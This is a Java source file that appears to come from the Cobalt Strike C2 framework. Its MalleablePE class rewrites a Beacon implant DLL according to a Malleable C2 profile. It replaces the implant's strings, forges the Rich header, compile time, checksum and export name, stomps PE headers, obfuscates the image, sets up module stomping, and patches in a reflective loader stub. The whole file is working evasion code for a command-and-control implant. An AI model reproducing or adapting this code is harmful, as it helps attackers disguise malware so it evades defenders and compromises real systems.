package pe;

import c2profile.Profile;
import c2profile.Program;
import common.CommonUtils;

import java.util.Arrays;
import java.util.Iterator;

public class MalleablePE {
    Profile profile;

    public MalleablePE(Profile profile) {
        this.profile = profile;
    }

    public byte[] strings(byte[] data) {
        String dataz = CommonUtils.bString(data);
        int index = dataz.indexOf("TTTTSSSSUUUUVVVVWWWWXXXXYYYYZZZZ");
        if (index == -1) {
            CommonUtils.print_error("new string table not found (MalleablePE)");
            return data;
        }
        Iterator i = this.profile.getToString(".stage").iterator();
        while (i.hasNext()) {
            String check = CommonUtils.bString((byte[]) i.next());
            if (!CommonUtils.isin(check, dataz)) continue;
            i.remove();
        }
        byte[] temp = CommonUtils.padg(this.profile.getToString(".stage").getBytes(), 4096);
        if (temp.length > 4096) {
            int old = temp.length;
            temp = Arrays.copyOfRange(temp, 0, 4096);
            CommonUtils.print_warn("Truncated PE strings table to " + temp.length + " bytes from " + old + " bytes");
        }
        dataz = CommonUtils.replaceAt(dataz, CommonUtils.bString(temp), index);
        return CommonUtils.toBytes(dataz);
    }

    public byte[] process(byte[] data, String arch) {
        data = this.pre_process(data, arch);
        return this.post_process(data, arch);
    }

    public byte[] pre_process(byte[] data, String arch) {
        data = this.strings(data);
        boolean userwx = this.profile.option(".stage.userwx");
        int img_size = this.profile.getInt(".stage.image_size_" + arch);
        String compilet = this.profile.getString(".stage.compile_time");
        boolean obfuscate = this.profile.option(".stage.obfuscate");
        String name = this.profile.getString(".stage.name");
        int checksum = this.profile.getInt(".stage.checksum");
        String module = this.profile.getString(".stage.module_" + arch);
        boolean stomppe = this.profile.option(".stage.stomppe");
        String rich_hdr = this.profile.getString(".stage.rich_header");
        int entrypoint = this.profile.getInt(".stage.entry_point");
        PEEditor editor = new PEEditor(data);
        editor.checkAssertions();
        if (!"<DEFAULT>".equals(rich_hdr)) {
            editor.insertRichHeader(CommonUtils.toBytes(rich_hdr));
        }
        if (stomppe) {
            editor.stompPE();
        }
        if (userwx) {
            editor.setRWXHint(userwx);
        }
        if (!compilet.equals("")) {
            editor.setCompileTime(compilet);
        }
        if (img_size > 0) {
            editor.setImageSize(img_size);
        }
        if (checksum > 0) {
            editor.setChecksum(checksum);
        }
        if (!name.equals("")) {
            editor.setExportName(name);
        }
        if (entrypoint >= 0) {
            editor.setEntryPoint(entrypoint);
        }
        editor.obfuscate(obfuscate);
        if (!module.equals("")) {
            editor.setModuleStomp(module);
        }
        return editor.getImage();
    }

    public byte[] post_process(byte[] data, String arch) {
        byte[] patched;
        String program;
        if ("x86".equals(arch)) {
            patched = BeaconLoader.patchDOSHeader(data);
            program = ".stage.transform-x86";
        } else if ("x64".equals(arch)) {
            patched = BeaconLoader.patchDOSHeaderX64(data);
            program = ".stage.transform-x64";
        } else {
            program = "";
            patched = new byte[]{};
        }
        Program temp = this.profile.getProgram(program);
        if (temp == null) {
            return patched;
        }
        return temp.transformData(patched);
    }
}

